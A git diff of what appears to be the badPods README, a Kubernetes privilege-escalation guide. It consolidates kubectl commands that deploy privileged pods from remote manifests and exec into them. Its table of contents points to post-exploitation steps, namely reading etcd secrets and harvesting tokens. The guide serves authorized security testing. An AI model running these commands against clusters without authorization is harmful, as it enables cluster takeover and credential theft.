@@ -16,7 +16,7 @@ Once you get an interactive shell, the Kubernetes privilege escalation paths are
   - [Deleting resources](#deleting-resources)
 - [Post exploitation](#post-exploitation)
   - [Can you run your pod on a control-plane node](#can-you-run-your-pod-on-a-control-plane-node)
-  - [Option 1: Mount the host's filesystem](#option-1-mount-the-hosts-filesystem)
+  - [Mount the host's filesystem](#mount-the-hosts-filesystem)
       - [Read secrets from etcd](#read-secrets-from-etcd)
     - [Look for kubeconfigs in the host filesystem](#look-for-kubeconfigs-in-the-host-filesystem)
     - [Grab all tokens from all pods on the system](#grab-all-tokens-from-all-pods-on-the-system)
@@ -40,48 +40,21 @@ Create one or more of these resource types and exec into the pod
 kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/pod/priv-exec-pod.yaml
 kubectl exec -it priv-exec-pod -- bash
 ```
-**Job**  
+**Job, CronJob, Deployment, StatefulSet, ReplicaSet, ReplicationController, DaemonSet**       
+For the rest of the resource types, there is one added step. Once you create your deployment, cronjob, etc., you need to find the pods that were created by your respective resource type. 
+
 ```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/job/priv-exec-job.yaml 
-kubectl get pods | grep priv-exec-job      
-kubectl exec -it priv-exec-job-[ID] -- bash
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/[RESOURCE_TYPE]/priv-exec-[RESOURCE_TYPE].yaml 
+kubectl get pods | grep priv-exec-[RESOURCE_TYPE]      
+kubectl exec -it priv-exec-[RESOURCE_TYPE]-[ID] -- bash
 ```
-**CronJob**  
-```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/cronjob/priv-exec-cronjob.yaml 
-kubectl get pods | grep priv-exec-cronjob      
-kubectl exec -it priv-exec-cronjob-ID -- bash
-```
-**Deployment**  
-```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/deployment/priv-exec-deployment.yaml 
-kubectl get pods | grep priv-exec-deployment        
-kubectl exec -it priv-exec-deployment-[ID] -- bash
-```
-**StatefulSet (This manifest also creates a service)**  
-```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/statefulset/priv-exec-statefulset.yaml
-kubectl get pods | grep priv-exec-statefulset
-kubectl exec -it priv-exec-statefulset-[ID] -- bash
-```
-**ReplicaSet**  
-```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/replicaset/priv-exec-replicaset.yaml
-kubectl get pods | grep priv-exec-replicaset
-kubectl exec -it priv-exec-replicaset-[ID] -- bash
+
+Keep in mind that if pod security policy blocks the pod, the resource type will still get created. The admission controller only blocks the pods that are created by the resource type. 
+
+To troubleshoot a case where you don't see pods, use `kubectl describe`
 
 ```
-**ReplicationController**  
-```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/replicationcontroller/priv-exec-replicationcontroller.yaml
-kubectl get pods | grep priv-exec-replicationcontroller
-kubectl exec -it priv-exec-replicationcontroller-[ID] -- bash
-```
-**DaemonSet**  
-```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/daemonset/priv-exec-daemonset.yaml 
-kubectl get pods | grep priv-exec-daemonset
-kubectl exec -it priv-exec-daemonset-[ID] -- bash
+kubectl describe priv-exec-[RESOURCE_TYPE]
 ```
 
 ## Reverse shell pods
@@ -140,7 +113,7 @@ Create your pod
 kubectl apply -f manifests/priv/job/priv-exec-job.yaml
 ```
 
-## Option 1: Mount the host's filesystem
+## Mount the host's filesystem
 Some of the privesc paths are not available if you mount the node's filesystem in this way. That said, it is easy enough to do that you might as well mount the device and see what you can see. 
 
 **First, check out the storage devices attached to the host:** 
